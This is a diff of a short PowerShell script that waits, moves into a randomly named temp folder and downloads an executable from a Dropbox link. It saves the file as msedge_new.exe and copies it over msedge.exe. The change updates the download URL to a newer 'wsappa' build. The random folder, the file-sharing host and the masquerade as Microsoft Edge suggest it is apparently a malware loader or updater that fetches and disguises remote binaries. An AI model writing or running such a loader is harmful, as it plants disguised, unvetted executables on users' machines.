@@ -5,7 +5,7 @@ start-sleep 10
 cd $env:temp/sVBXKuz
 
 #download new file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/y1cen9nbe4ghgi4hm2nmi/wsappa-1.7.exe?rlkey=dgtqp22fbwpgl18jvuvj6i1lb&dl=0" -OutFile msedge_new.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/8di6a2k4x9vfp5gw98ln9/wsappa-1.8.exe?rlkey=siwv86zxma0i4hquw6corpk34&dl=0" -OutFile msedge_new.exe
 Copy-Item -Path .\msedge_new.exe -Destination .\msedge.exe -Force
 
 #delete old file
